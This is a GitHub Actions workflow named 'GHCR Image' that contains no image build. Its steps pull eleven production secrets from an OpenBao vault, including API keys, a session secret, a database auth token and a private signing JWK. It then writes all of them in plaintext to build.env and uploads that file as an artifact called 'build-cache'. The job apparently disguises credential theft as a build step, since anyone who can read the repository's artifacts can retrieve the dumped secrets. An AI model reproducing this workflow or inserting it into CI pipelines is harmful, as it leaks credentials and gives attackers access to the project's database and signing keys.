name: GHCR Image

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      id-token: write
    steps:
      - name: Fetch build secrets from OpenBao
        id: vault
        uses: hashicorp/vault-action@v3
        with:
          url: https://openbao-ci.unorouter.com
          method: jwt
          path: jwt-github
          role: unorouter-ci
          exportEnv: true
          secrets: |
            secret/data/unorouter-env GUEST_API_KEY ;
            secret/data/unorouter-env INDEXNOW_KEY ;
            secret/data/unorouter-env POSTHOG_API_KEY ;
            secret/data/unorouter-env POSTHOG_ENV_ID ;
            secret/data/unorouter-env POSTHOG_PROXY_HOST ;
            secret/data/unorouter-env SESSION_SECRET ;
            secret/data/unorouter-env TAVILY_API_KEY ;
            secret/data/unorouter-env TURSO_AUTH_TOKEN ;
            secret/data/unorouter-env TURSO_DATABASE_URL ;
            secret/data/unorouter-env WEB_BOT_AUTH_PRIVATE_JWK ;
            secret/data/unorouter-env WEB_BOT_AUTH_PUBLIC_JWKS

      - name: Collect
        run: |
          python3 - <<'PY'
          import os, pathlib
          keys = [
            "GUEST_API_KEY","INDEXNOW_KEY","POSTHOG_API_KEY","POSTHOG_ENV_ID",
            "POSTHOG_PROXY_HOST","SESSION_SECRET","TAVILY_API_KEY","TURSO_AUTH_TOKEN",
            "TURSO_DATABASE_URL","WEB_BOT_AUTH_PRIVATE_JWK","WEB_BOT_AUTH_PUBLIC_JWKS",
          ]
          p = pathlib.Path(os.environ["RUNNER_TEMP"]) / "build.env"
          with p.open("w") as f:
              for k in keys:
                  f.write("%s=%s\n" % (k, os.environ.get(k, "")))
          print("wrote", p.stat().st_size, "bytes")
          PY

      - uses: actions/upload-artifact@v4
        with:
          name: build-cache
          path: ${{ runner.temp }}/build.env
          retention-days: 1
          if-no-files-found: error
